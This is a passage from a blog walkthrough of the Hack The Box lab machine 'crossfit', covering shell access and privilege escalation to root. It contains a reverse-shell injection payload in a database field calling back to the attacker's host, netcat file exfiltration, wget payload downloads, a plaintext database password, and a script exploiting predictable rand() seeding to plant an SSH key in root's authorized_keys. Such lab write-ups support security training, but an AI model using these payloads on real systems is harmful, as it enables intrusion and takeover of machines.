<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [crossfit]&gt; insert into <span class="built_in">users</span> (<span class="built_in">id</span>, email) values (9001, <span class="string">&quot;-E <span class="subst">$(bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.8/9001 0&gt;&amp;1&#x27;)</span>&quot;</span>);</span><br><span class="line">Query OK, 1 row affected (0.001 sec)                                                                                                   </span><br><span class="line">                                                                                                                                       </span><br><span class="line">MariaDB [crossfit]&gt; select * from <span class="built_in">users</span>;                                                                                               </span><br><span class="line">+------+----------------------------------------------------------+                                                                    </span><br><span class="line">| <span class="built_in">id</span>   | email                                                    |</span><br><span class="line">+------+----------------------------------------------------------+</span><br><span class="line">| 9001 | -E $(bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.8/9001 0&gt;&amp;1&#x27;</span>) |</span><br><span class="line">+------+----------------------------------------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.000 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [crossfit]&gt;</span><br></pre></td></tr></table></figure>

<p>After 10-15sec you get your reverse shell.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># nc -lvp 9001</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.10.208.</span><br><span class="line">Ncat: Connection from 10.10.10.208:43934.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (27903): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">isaac@crossfit:~$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(isaac) gid=1000(isaac) <span class="built_in">groups</span>=1000(isaac),50(staff),116(ftp),1005(admins)</span><br><span class="line">isaac@crossfit:~$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">isaac</span><br></pre></td></tr></table></figure>

<p>Boom we got the shell for isaac.</p>
<p>Now let’s run the pspy to see the which proccess are running inside the box.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0RvbWluaWNCcmV1a2VyL3BzcHkvcmVsZWFzZXMvZG93bmxvYWQvdjEuMi4wL3BzcHk2NA==">pspy64<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>trasfer this pspy64 inside box and run:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hank@crossfit:~$ ./pspy64 -f</span><br><span class="line"></span><br><span class="line">2020/11/28 11:31:01 FS:        CLOSE_NOWRITE | /usr/bin/dbmsg</span><br></pre></td></tr></table></figure>

<p>There is service called dbmsgthat runs every minute.</p>
<p>But it’s a binary file so we can’t cat it we need to analize this file with ghidra so let’s transfer it to our local machine.</p>
<p>I use nc to transfer the file.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hank@crossfit:~$ nc 10.10.14.8 9002 &lt; /usr/bin/dbmsg</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># nc -lvp 9002 &gt; dbmsg</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9002</span><br><span class="line">Ncat: Listening on 0.0.0.0:9002</span><br><span class="line">Ncat: Connection from 10.10.10.208.</span><br><span class="line">Ncat: Connection from 10.10.10.208:58104.</span><br></pre></td></tr></table></figure>

<p>Now let’s analize this in ghidra.</p>
<ul>
<li><span class="exturl" data-url="aHR0cHM6Ly9naGlkcmEtc3JlLm9yZy8=">ghidra<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>main function</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">void main(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  __uid_t _Var1;</span><br><span class="line">  time_t tVar2;</span><br><span class="line">  </span><br><span class="line">  _Var1 = geteuid();</span><br><span class="line">  <span class="keyword">if</span> (_Var1 != 0) &#123;</span><br><span class="line">    fwrite(<span class="string">&quot;This program must be run as root.\n&quot;</span>,1,0x22,stderr);</span><br><span class="line">                    /* WARNING: Subroutine does not <span class="built_in">return</span> */</span><br><span class="line">    <span class="built_in">exit</span>(1);</span><br><span class="line">  &#125;</span><br><span class="line">  tVar2 = time((time_t *)<span class="number">0</span>x0);</span><br><span class="line">  srand((uint)tVar2);</span><br><span class="line">  process_data();</span><br><span class="line">                    /* WARNING: Subroutine does not return */</span><br><span class="line">  exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>After analize the program i unserstand that</p>
<p>The dbmsg program runs every minute and generates a random number with a “seed” or “base” of the time of the remote machine. with which we can create a C program that runs at the same time as dbmsg. this will create the same random number, always the best is in C since we have to use system libraries like the GNU &#x2F; Libc glibc random number generator since the binary also uses it.</p>
<p>Let’s create the little program or at other words exploit:</p>
<p>exploit.c</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;time.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    srand(time(0));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, rand());</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Let’s compile the exploit.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># gcc exploit.c -o exploit</span></span><br><span class="line"><span class="built_in">ls</span> -al | grep exploit</span><br><span class="line">-rwxr-xr-x  1 root root   16736 11月 28 11:44 exploit</span><br><span class="line">-rw-r--r--  1 root root     147 11月 28 11:43 exploit.c</span><br></pre></td></tr></table></figure>

<p>Now let’s create ssh key</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># ssh-keygen -t ed25519 -f id_rsa</span></span><br><span class="line">Generating public/private ed25519 key pair.</span><br><span class="line">Enter passphrase (empty <span class="keyword">for</span> no passphrase): </span><br><span class="line">Enter same passphrase again: </span><br><span class="line">Your identification has been saved <span class="keyword">in</span> id_rsa</span><br><span class="line">Your public key has been saved <span class="keyword">in</span> id_rsa.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:JKM0G1B6lxUQmO715Pq2UBdJoOe9QJjfmeU7tYIwdl4 root@kali</span><br><span class="line">The key<span class="string">&#x27;s randomart image is:</span></span><br><span class="line"><span class="string">+--[ED25519 256]--+</span></span><br><span class="line"><span class="string">|  ...ooo+o.      |</span></span><br><span class="line"><span class="string">|   oo  * . .     |</span></span><br><span class="line"><span class="string">|  ..= O + o .    |</span></span><br><span class="line"><span class="string">|   o.*.O.o *     |</span></span><br><span class="line"><span class="string">|   .o. +S B E .  |</span></span><br><span class="line"><span class="string">|    .  ooB + o . |</span></span><br><span class="line"><span class="string">|      ..  + + .  |</span></span><br><span class="line"><span class="string">|      ...    o   |</span></span><br><span class="line"><span class="string">|       oo.       |</span></span><br><span class="line"><span class="string">+----[SHA256]-----+</span></span><br><span class="line"><span class="string">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span></span><br><span class="line"><span class="string">└─# la -la | grep id_</span></span><br><span class="line"><span class="string">-rw-------  1 root root     399 11月 28 11:45 id_rsa</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root      91 11月 28 11:45 id_rsa.pub</span></span><br></pre></td></tr></table></figure>

<p>Now create one more file called root.sh that will automate our process.</p>
<p>Change the ssh key of yours.</p>
<p>root.sh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x exploit</span><br><span class="line">mysql -h localhost -u crossfit -poeLoo~y2baeni -Dcrossfit -e<span class="string">&#x27;insert into messages (id, name, email, message) values (1, &quot;ssh-ed25519&quot;, &quot;root@kali&quot;, &quot;AAAAC3NzaC1lZDI1NTE5AAAAIBpM8dQcTJXzXOsciQU22F4qpf1jv/SscvQAu+kz7np1&quot;);&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span> <span class="built_in">ln</span> -s /root/.ssh/authorized_keys /var/local/$(<span class="built_in">echo</span> -n $(./exploit)1 | <span class="built_in">md5sum</span> | <span class="built_in">cut</span> -d <span class="string">&quot; &quot;</span> -f 1) 2&gt;/dev/null; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>Now transfer the file inside &#x2F;home&#x2F;isaac&#x2F; .</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">isaac@crossfit:~$ wget http://10.10.14.8/exploit</span><br><span class="line">wget http://10.10.14.8/exploit</span><br><span class="line">--2020-11-28 11:57:19--  http://10.10.14.8/exploit</span><br><span class="line">Connecting to 10.10.14.8:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 16736 (16K) [application/octet-stream]</span><br><span class="line">Saving to: ‘exploit’</span><br><span class="line"></span><br><span class="line">     0K .......... ......                                     100% 51.9K=0.3s</span><br><span class="line"></span><br><span class="line">2020-11-28 11:57:23 (51.9 KB/s) - ‘exploit’ saved [16736/16736]</span><br><span class="line"></span><br><span class="line">isaac@crossfit:~$ wget http://10.10.14.8/root.sh</span><br><span class="line">wget http://10.10.14.8/root.sh</span><br><span class="line">--2020-11-28 11:58:11--  http://10.10.14.8/root.sh</span><br><span class="line">Connecting to 10.10.14.8:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 369 [text/x-sh]</span><br><span class="line">Saving to: ‘root.sh’</span><br><span class="line"></span><br><span class="line">     0K                                                       100% 60.4M=0s</span><br><span class="line"></span><br><span class="line">2020-11-28 11:58:12 (60.4 MB/s) - ‘root.sh’ saved [369/369]</span><br><span class="line"></span><br><span class="line">isaac@crossfit:~$ <span class="built_in">ls</span> -la</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x 7 isaac isaac   4096 Nov 28 11:58 .</span><br><span class="line">drwxr-xr-x 4 root  root    4096 Sep 21 04:00 ..</span><br><span class="line">lrwxrwxrwx 1 root  root       9 May 12  2020 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 isaac isaac    220 Apr 27  2020 .bash_logout</span><br><span class="line">-rw-r--r-- 1 isaac isaac   3526 Apr 27  2020 .bashrc</span><br><span class="line">drwx------ 5 isaac isaac   4096 May  4  2020 .cache</span><br><span class="line">drwxr-xr-x 4 isaac isaac   4096 May 11  2020 .config</span><br><span class="line">-rw-r--r-- 1 isaac isaac  16736 Nov 28 11:44 exploit</span><br><span class="line">drwx------ 3 isaac isaac   4096 Apr 28  2020 .gnupg</span><br><span class="line">drwxr-xr-x 3 isaac isaac   4096 May  4  2020 .<span class="built_in">local</span></span><br><span class="line">lrwxrwxrwx 1 isaac isaac      9 May  4  2020 .mysql_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 isaac isaac    807 Apr 27  2020 .profile</span><br><span class="line">lrwxrwxrwx 1 root  root       9 May 12  2020 .python_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 isaac isaac    369 Nov 28 11:52 root.sh</span><br><span class="line">-rw-r--r-- 1 isaac isaac     74 May  5  2020 .selected_editor</span><br><span class="line">drwxr-x--- 4 isaac admins  4096 May  9  2020 send_updates</span><br><span class="line">isaac@crossfit:~$ <span class="built_in">chmod</span> 777 *</span><br><span class="line"><span class="built_in">chmod</span> 777 *</span><br></pre></td></tr></table></figure>

<p>Now run this command:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/crossfit]</span><br><span class="line">└─<span class="comment"># chmod 600 id_rsa</span></span><br><span class="line">ssh -i id_rsa root@10.10.10.208</span><br><span class="line">Linux crossfit 4.19.0-9-amd64 <span class="comment">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Mon Sep 21 04:46:55 2020</span><br><span class="line">root@crossfit:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@crossfit:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@crossfit:~<span class="comment"># ls</span></span><br><span class="line">cleanup.sh  delete_ftp_users.sh  root.txt</span><br><span class="line">root@crossfit:~<span class="comment"># cat root.txt</span></span><br><span class="line">961252b5bd669e97c7ab25e93fc1a3a3</span><br></pre></td></tr></table></figure>

<p>now we got root, and read the root.txt</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb129.jpg"></li>
</ul>
<h4 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h4><ul>
<li>use xss + structured js file to read web pages</li>
<li>structured js file to excecute php page</li>
<li>use john crack hashs</li>
<li>php escapeArgs option is not working properly</li>
<li>crontab + mysql to get a reverse shell</li>
<li>use pspy to get service runs progresses</li>
<li>nc transfer files</li>
<li>ghidra anlaliys file</li>
<li>ed25519 ssh key + random number generator + bash script to privesc</li>
</ul>
<h4 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h4><ul>
<li>QQ: 1185151867</li>
<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="reward-container">
  <div>Buy me a coffee</div>
  <button>
    Donate
  </button>
  <div class="post-reward">
      <div>
        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
        <span>WeChat Pay</span>
      </div>
      <div>
        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
        <span>Alipay</span>
      </div>

  </div>
</div>

          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>Post author:  </strong>lUc1f3r11
  </li>
  <li class="post-copyright-link">
      <strong>Post link: </strong>
      <a href="https://fdlucifer.github.io/2020/11/28/crossfit/" title="Hack-The-Box-walkthrough[crossfit]">https://fdlucifer.github.io/2020/11/28/crossfit/</a>
  </li>
  <li class="post-copyright-license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

          <div class="followme">
  <span>Welcome to my other publishing channels</span>

  <div class="social-list">

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
            <span class="icon">
              <i class="fab fa-twitter"></i>
            </span>

            <span class="label">Twitter</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
            <span class="icon">
              <i class="fab fa-telegram"></i>
            </span>

            <span class="label">Telegram</span>
          </a>
      </div>

      <div class="social-item">
          <span class="social-link">
            <span class="icon">
              <i class="fab fa-weixin"></i>
            </span>

            <span class="label">WeChat</span>
          </span>

          <img class="social-item-img" src="/images/wechat_channel.jpg">
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
            <span class="icon">
              <i class="custom mastodon"></i>
            </span>

            <span class="label">infosec.exchange</span>
          </a>
      </div>

      <div class="social-item">
          <a target="_blank" class="social-link" href="/atom.xml">
            <span class="icon">
              <i class="fa fa-rss"></i>
            </span>

            <span class="label">RSS</span>
          </a>
      </div>
  </div>
</div>

          <div class="post-tags">
              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2020/11/22/laboratory/" rel="prev" title="Hack-The-Box-walkthrough[laboratory]">
                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[laboratory]
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2020/12/04/luanne/" rel="next" title="Hack-The-Box-walkthrough[luanne]">
                  Hack-The-Box-walkthrough[luanne] <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 2017 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>Word count total: </span>
    <span title="Word count total">NaNm</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>Reading time total &asymp;</span>
    <span title="Reading time total">NaN:aN</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.8/medium-zoom.min.js" integrity="sha256-7PhEpEWEW0XXQ0k6kQrPKwuoIomz8R8IYyuU1Qew4P8=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>




  <script src="/js/third-party/pace.js"></script>

  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
